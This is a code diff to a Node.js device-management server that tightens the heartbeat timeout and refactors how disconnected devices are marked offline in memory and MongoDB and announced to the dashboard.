@@ -866,7 +866,7 @@ const TCP_PORT  = parseInt(process.env.TCP_PORT)  || 6000;
 const HTTP_PORT = parseInt(process.env.PORT)       || 5000;
 const ZEABUR_PORT_API_PORT = parseInt(process.env.ZEABUR_PORT_API_PORT) || 8070;
 const PING_INTERVAL  = 20000;   // ms – ping every 20 s (was 30 s); faster detection of 3G drops
-const PONG_TIMEOUT   = 90000;   // ms – drop if no pong in 90 s (3 missed pings); was 120 s
+const PONG_TIMEOUT   = 60000;   // ms – drop after three missed 20 s pings
 const CMD_TIMEOUT_MS = 45000;   // ms – command timeout (45 s); was 60 s
 
 // ============================================
@@ -1389,6 +1389,31 @@ function persistDeviceHeartbeat(deviceId) {
         { $set: { lastSeen: new Date(now), isOnline: true } },
     ).maxTimeMS(MONGO_OPERATION_TIMEOUT_MS).exec().catch(() => {});
 }
+
+function markDeviceOffline(deviceId, timestamp = new Date()) {
+    // Keep live dashboard state independent of MongoDB availability.
+    const record = inMemoryDevices.get(deviceId);
+    if (record) {
+        inMemoryDevices.set(deviceId, { ...record, isOnline: false, lastSeen: timestamp });
+    }
+    R.markDeviceOffline(deviceId).catch(() => {});
+    if (mongoose.connection.readyState !== 1) return;
+    Device.findOneAndUpdate(
+        { deviceId },
+        { $set: { isOnline: false, lastSeen: timestamp } },
+    ).maxTimeMS(MONGO_OPERATION_TIMEOUT_MS).exec().catch(() => {});
+}
+
+function broadcastDeviceDisconnected(deviceId, timestamp = new Date()) {
+    const accessId = inMemoryDevices.get(deviceId)?.accessId || '';
+    broadcastDashScoped(
+        'device:disconnected',
+        { deviceId, accessId, timestamp },
+        accessId || null,
+    );
+    void broadcastDeviceList();
+}
+
 const realtimeSseState = new Map();      // clientId → { sending, latestPayload }
 const SELECTED_DEVICE_STREAM_EVENTS = new Set(['screen:update', 'stream:frame', 'camera:frame']);
 /** @type {Map<string, Object>} Latest JPEG stream frame per device — polled by dashboard */
@@ -2381,7 +2406,7 @@ const tcpServer = tls.createServer({ key: tlsKey, cert: tlsCert, allowHalfOpen: 
                 // rotation, mobile network handoffs) don't produce false offline flashes in the UI.
                 const disconnectedDeviceId = conn.deviceId;
                 const disconnectedConnId   = id;
-                const finishDisconnect = async () => {
+                const finishDisconnect = () => {
                     // Re-check: if a new primary has registered in the meantime, skip broadcast
                     if (deviceToTcp.get(disconnectedDeviceId) !== disconnectedConnId &&
                         deviceToTcp.has(disconnectedDeviceId)) {
@@ -2398,17 +2423,9 @@ const tcpServer = tls.createServer({ key: tlsKey, cert: tlsCert, allowHalfOpen: 
                     stopTextWatchForDevice(disconnectedDeviceId, 'Device went offline; watcher stopped.');
                     deviceToTcp.delete(disconnectedDeviceId);
                     deviceStreamingState.delete(disconnectedDeviceId);
-                    R.markDeviceOffline(disconnectedDeviceId).catch(() => {});
-                    try {
-                        await Device.findOneAndUpdate({ deviceId: disconnectedDeviceId },
-                            { isOnline: false, lastSeen: new Date() });
-                    } catch (e) {}
-                    {
-                        const rec = inMemoryDevices.get(disconnectedDeviceId);
-                        const aid = (rec && rec.accessId) || '';
-                        broadcastDashScoped('device:disconnected', { deviceId: disconnectedDeviceId, accessId: aid, timestamp: new Date() }, aid || null);
-                    }
-                    broadcastDeviceList();
+                    const disconnectedAt = new Date();
+                    markDeviceOffline(disconnectedDeviceId, disconnectedAt);
+                    broadcastDeviceDisconnected(disconnectedDeviceId, disconnectedAt);
                 };
                 setTimeout(finishDisconnect, 3000);
             }
@@ -6378,7 +6395,7 @@ setInterval(() => {
 }, PING_INTERVAL);
 
 // Drop stale TCP connections — handle primary and secondary channels separately
-setInterval(async () => {
+setInterval(() => {
     const now = Date.now();
     for (const [id, conn] of tcpClients) {
         if (!conn.deviceId) continue;
@@ -6399,13 +6416,9 @@ setInterval(async () => {
                     continue; // Ghost socket from previous reconnect — discard silently
                 }
                 deviceToTcp.delete(conn.deviceId);
-                try { await Device.findOneAndUpdate({ deviceId: conn.deviceId }, { isOnline: false, lastSeen: new Date() }); } catch (e) {}
-                {
-                    const rec = inMemoryDevices.get(conn.deviceId);
-                    const aid = (rec && rec.accessId) || '';
-                    broadcastDashScoped('device:disconnected', { deviceId: conn.deviceId, accessId: aid, timestamp: new Date() }, aid || null);
-                }
-                broadcastDeviceList();
+                const disconnectedAt = new Date();
+                markDeviceOffline(conn.deviceId, disconnectedAt);
+                broadcastDeviceDisconnected(conn.deviceId, disconnectedAt);
             }
         }
     }
